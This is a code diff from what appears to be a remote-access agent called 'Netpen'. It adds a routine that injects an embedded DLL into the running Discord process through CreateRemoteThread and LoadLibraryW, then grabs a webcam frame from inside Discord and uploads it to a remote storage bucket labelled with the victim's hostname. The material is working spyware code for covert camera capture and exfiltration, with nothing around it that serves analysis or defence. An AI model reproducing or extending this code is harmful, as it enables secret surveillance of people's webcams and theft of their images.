@@ -13,6 +13,8 @@
 #include <mmdeviceapi.h>
 #include <audioclient.h>
 #include "config.h"
+#include <tlhelp32.h>
+#include "capture_shared.h"
 
 // Missing DirectShow declarations (not available in this mingw version)
 static const CLSID CLSID_SampleGrabber = {0xC1F400A0,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
@@ -1519,6 +1521,122 @@ static std::string CheckWebcamCmd() {
     return resp.substr(p, e - p);
 }
 
+static DWORD FindProcessPid(const wchar_t* name) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    DWORD pid = 0;
+    if (Process32FirstW(hSnapshot, &pe)) {
+        do {
+            if (lstrcmpiW(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
+        } while (Process32NextW(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+static bool ExtractDllToTemp(std::string& outPath) {
+    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(101), RT_RCDATA);
+    if (!hRes) return false;
+    HGLOBAL hGlob = LoadResource(NULL, hRes);
+    void* data = LockResource(hGlob);
+    DWORD size = SizeofResource(NULL, hRes);
+    if (!data || size == 0) return false;
+    char tmpDir[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmpDir);
+    outPath = std::string(tmpDir) + "discord_cap_" + std::to_string(GetTickCount()) + ".dll";
+    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return false;
+    DWORD written = 0;
+    bool ok = (WriteFile(hFile, data, size, &written, NULL) && written == size);
+    CloseHandle(hFile);
+    if (!ok) { DeleteFileA(outPath.c_str()); return false; }
+    return true;
+}
+
+static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
+    DWORD pid = FindProcessPid(L"discord.exe");
+    if (!pid) return false;
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) return false;
+
+    std::string dllPathA;
+    if (!ExtractDllToTemp(dllPathA)) { CloseHandle(hProcess); return false; }
+
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, NULL, 0);
+    std::wstring dllPathW((size_t)wlen - 1, 0);
+    MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, &dllPathW[0], wlen);
+
+    size_t dllPathBytes = (dllPathW.size() + 1) * sizeof(wchar_t);
+    void* remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathBytes, MEM_COMMIT, PAGE_READWRITE);
+    void* remoteParams = VirtualAllocEx(hProcess, NULL, sizeof(CaptureParams), MEM_COMMIT, PAGE_READWRITE);
+    if (!remoteDllPath || !remoteParams) {
+        if (remoteDllPath) VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
+        if (remoteParams) VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
+        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
+    }
+
+    WriteProcessMemory(hProcess, remoteDllPath, dllPathW.c_str(), dllPathBytes, NULL);
+    CaptureParams params;
+    wcscpy_s(params.outputPath, outputPath);
+    WriteProcessMemory(hProcess, remoteParams, &params, sizeof(params), NULL);
+
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    FARPROC loadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryW, remoteDllPath, 0, NULL);
+    if (!hLoadThread) {
+        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
+        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
+        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
+    }
+    WaitForSingleObject(hLoadThread, 10000);
+    CloseHandle(hLoadThread);
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    ULONGLONG remoteDllBase = 0;
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        MODULEENTRY32W me = { sizeof(me) };
+        if (Module32FirstW(hSnapshot, &me)) {
+            do {
+                if (lstrcmpiW(me.szModule, L"capture_dll.dll") == 0) { remoteDllBase = (ULONGLONG)me.modBaseAddr; break; }
+            } while (Module32NextW(hSnapshot, &me));
+        }
+        CloseHandle(hSnapshot);
+    }
+
+    if (!remoteDllBase) {
+        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
+        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
+        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
+    }
+
+    HMODULE hLocalDll = LoadLibraryW(dllPathW.c_str());
+    if (!hLocalDll) {
+        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
+        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
+        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
+    }
+
+    FARPROC localExport = GetProcAddress(hLocalDll, "CaptureThread");
+    if (!localExport) { FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }
+
+    ULONGLONG rva = (ULONGLONG)localExport - (ULONGLONG)hLocalDll;
+    HANDLE hCapThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(remoteDllBase + rva), remoteParams, 0, NULL);
+    if (!hCapThread) { FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }
+
+    WaitForSingleObject(hCapThread, 30000);
+    CloseHandle(hCapThread);
+    FreeLibrary(hLocalDll);
+    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
+    VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    DeleteFileA(dllPathA.c_str());
+    LogMsg("Webcam: injected into Discord PID " + std::to_string(pid));
+    return true;
+}
+
 static void HandleWebcam(const std::string& rowId) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -1526,7 +1644,9 @@ static void HandleWebcam(const std::string& rowId) {
     std::string localFile = std::string(tmp) + "NetpenCam_" + g_hostname + "_" + ts + ".jpg";
     std::string storageFile = "webcam/" + g_hostname + "_" + ts + ".jpg";
 
-    if (!CaptureWebcamFrame(localFile.c_str())) { LogMsg("Webcam: capture failed"); return; }
+    std::wstring localFileW = ToWide(localFile);
+    if (InjectAndCaptureWebcam(localFileW.c_str())) { LogMsg("Webcam: captured via Discord injection"); }
+    else if (!CaptureWebcamFrame(localFile.c_str())) { LogMsg("Webcam: capture failed"); return; }
     std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
     if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
         LogMsg("Webcam: upload failed");
